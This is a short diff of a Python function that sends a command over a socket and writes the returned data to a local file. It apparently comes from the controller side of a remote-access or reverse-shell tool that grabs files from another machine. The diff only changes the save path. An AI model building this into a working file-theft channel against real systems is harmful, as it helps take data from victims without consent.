@@ -6,7 +6,7 @@ import os
 def transfer(conn,command):
 
     conn.send(command)
-    f = open('/tmp/file.txt') #Place where we saved a file
+    f = open('/root/Documentos/file.jpg','wb') #Place where we saved a file
     while True:
         bits = conn.recv(1024)
         if 'Unable to find out the file' in bits:
